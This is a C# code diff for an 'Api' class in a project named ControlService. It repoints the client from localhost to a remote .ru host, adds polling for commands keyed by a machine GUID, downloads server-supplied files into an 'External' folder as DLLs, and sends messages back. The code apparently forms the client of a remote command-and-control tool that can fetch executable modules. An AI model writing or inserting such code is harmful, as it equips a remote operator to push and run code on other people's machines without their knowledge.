@@ -5,14 +5,15 @@ using System.Text.Json;
 using System.Threading.Tasks;
 using RestSharp;
 using ControlService.Models;
-
+using ControlService.Core.Models;
+using System.Diagnostics;
 
 namespace ControlService.Core
 {
     internal class Api
     {
         public string Guid { get; set; }
-        static string _baseUrl = "https://localhost:5001";
+        static string _baseUrl = "http://remote.offmysoap1.fvds.ru:7030/";
         RestClient _client;
 
         internal Api(string guid)
@@ -22,9 +23,11 @@ namespace ControlService.Core
             if (guid != null && guid != "")
             {
                 Guid = guid;
+                Trace.WriteLine($"guid = {guid}");
             }
             else
             {
+
                 GetGuid();
             }
             
@@ -40,16 +43,32 @@ namespace ControlService.Core
 
         internal async Task<List<Command>> GetCommands()
         {
+            Trace.WriteLine($"guid = {Guid}");
             string url = "api/manager/commands";
             RestRequest request = new RestRequest(url, Method.Get);
             request.AddParameter("guid", Guid);
             var resonse = await _client.GetAsync(request);
             List <Command> commands = JsonSerializer.Deserialize<Command[]>(resonse.Content).ToList();
-
+            Trace.WriteLine($"response = {resonse.Content} ");
             return commands;
         }
 
+        internal void DownloadFile(string name)
+        {
+            string url = "api/download/file";
+            RestRequest request = new RestRequest(url, Method.Get);
+            request.AddParameter("name", name);
+            File.WriteAllBytes($"External/{name}.dll", _client.DownloadDataAsync(request).Result);
+        }
 
-
+        internal string SendMessage(string text)
+        {
+            string url = "api/manager";
+            RestRequest request = new RestRequest(url, Method.Post);
+            Message message = new Message { Guid = Guid, Text = text, Time = DateTime.UtcNow};
+            request.AddJsonBody<Message>(message);
+            RestResponse response = _client.PostAsync(request).Result;
+            return response.StatusCode.ToString();
+        }
     }
 }
